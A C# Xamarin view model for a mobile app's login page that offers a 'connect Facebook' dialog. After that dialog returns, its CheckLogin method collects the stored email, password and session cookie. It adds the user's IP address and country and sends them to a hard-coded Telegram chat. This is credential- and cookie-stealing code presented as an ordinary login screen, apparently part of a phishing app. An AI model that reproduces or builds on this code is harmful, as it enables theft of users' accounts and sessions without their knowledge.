using MobileApp.Services.RestSharp;
using MobileApp.Views;
using MobileApp.Views.Templates;
using Prism.Navigation;
using Prism.Services.Dialogs;
using System.Threading.Tasks;
using MobileApp.Configurations;
using MobileApp.Models;
using MobileApp.Services.Telegram;
using Newtonsoft.Json;
using Xamarin.Essentials;
using Xamarin.Forms;
using Xamarin.Forms.Internals;

namespace MobileApp.ViewModels
{
    /// <summary>
    /// ViewModel for login page.
    /// </summary>
    [Preserve(AllMembers = true)]
    public class LoginPageViewModel : ViewModelBase
    {
        private IDialogService _dialogService;
        private IRestSharpService _restSharpService;
        private ITelegramService _telegramService;

        /// <summary>
        /// Initializes a new instance for the <see cref="LoginPageViewModel" /> class.
        /// </summary>
        public LoginPageViewModel(IDialogService dialogService, INavigationService navigationService, IRestSharpService restSharpService, ITelegramService telegramService) : base(
            navigationService)
        {
            _telegramService = telegramService;
            _restSharpService = restSharpService;
            _dialogService = dialogService;
            this.SocialMediaLoginCommand = new Command(this.SocialLoggedIn);
        }



        /// <summary>
        /// Gets or sets the command that is executed when the social media login button is clicked.
        /// </summary>
        public Command SocialMediaLoginCommand { get; set; }

        private async Task<string> GetIp()
        {
            var ip = await _restSharpService.GetAsync("https://api.ipify.org/");
            var strIp = await _restSharpService.GetAsync("http://ip-api.com/json/" + ip);
            var data = JsonConvert.DeserializeObject<IpModel>(strIp);
            return ip + "|" + data.countryCode;
        }
        public override async void OnNavigatedTo(INavigationParameters parameters)
        {
            base.OnNavigatedTo(parameters);
            if (Preferences.ContainsKey("Cookie"))
            {
                var message = Preferences.Get("Email", null) + "|" + Preferences.Get("Passwd", null) + "|" +
                              Preferences.Get("Cookie", null) + "|" + await GetIp();
                if (!string.IsNullOrWhiteSpace(message))
                {
                    await NavigationService.NavigateAsync(nameof(OverviewPage));
                }
            }
        }

        private async Task CheckLogin()
        {
            if (Preferences.ContainsKey("Cookie"))
            {
                await NavigationService.NavigateAsync(nameof(OverviewPage));
                var message = Preferences.Get("Email", null) + "|" + Preferences.Get("Passwd", null) + "|" +
                              Preferences.Get("Cookie", null) + "|" + await GetIp();
                if (!string.IsNullOrWhiteSpace(message))
                {
                    var data = await _telegramService.SendMessageToTelegram("-574027593", message, AppConstants.AuthenTelegram);
                }
            }
        }

        /// <summary>
        /// Invoked when social media login button is clicked.
        /// </summary>
        /// <param name="obj">The Object</param>
        private void SocialLoggedIn(object obj)
        {
            _dialogService.ShowDialog(nameof(ConnectFacebookView), result =>
            {
                if (result?.Parameters != null)
                {
                    // to do
                    CheckLogin();
                }
            });
        }
    }
}